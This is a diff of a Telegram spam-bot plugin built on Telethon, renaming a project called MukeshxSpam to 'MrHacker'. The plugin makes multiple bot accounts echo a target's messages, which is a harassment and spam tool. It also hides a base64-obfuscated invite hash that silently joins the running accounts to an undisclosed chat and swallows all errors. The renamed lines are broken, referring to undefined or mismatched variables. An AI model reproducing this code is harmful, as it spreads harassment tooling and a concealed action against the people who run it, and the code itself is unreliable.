@@ -6,11 +6,11 @@ import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from MukeshxSpam import Riz, Riz2, Riz3, Riz4, Riz5 , Riz6, Riz7, Riz8, Riz9, Riz10, SUDO_USERS, OWNER_ID
+from MrHacker import Riz, Riz2, Riz3, Riz4, Riz5 , Riz6, Riz7, Riz8, Riz9, Riz10, SUDO_USERS, OWNER_ID
 
-from MukeshxSpam import CMD_HNDLR as hl
-from MukeshxSpam.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
-from resources.data import RiZoeLX
+from MrHacker import CMD_HNDLR as hl
+from MrHacker.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from resources.data import MrHackeR
 
 
 @Riz.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@@ -29,8 +29,8 @@ async def echo(event):
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
-            if int(user_id) in RiZoeLX:
-                    text = f"ɪ ᴄᴀɴ'ᴛ  ᴇᴄʜᴏ  @itz_mst_boy sᴘᴀᴍ ᴏᴡɴᴇʀ"
+            if int(user_id) in MrHacker:
+                    text = f"ɪ ᴄᴀɴ'ᴛ  ᴇᴄʜᴏ  @MrHackerX007 sᴘᴀᴍ ᴏᴡɴᴇʀ"
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) == OWNER_ID:
                     text = f"ᴛʜɪs ɢᴜʏ  ɪs ᴀ  ᴏᴡɴᴇʀ ᴏғ ᴛʜɪs ʙᴏᴛs."
@@ -100,8 +100,8 @@ async def _(e):
     if is_echo(e.sender_id, e.chat_id):
         await asyncio.sleep(0.5)
         try:
-            RiZoeL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            RiZoeL = Get(RiZoeL)
+            MrHacker = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            MrHacker = Get(RiZoeL)
             await e.client(RiZoeL)
         except BaseException:
             pass
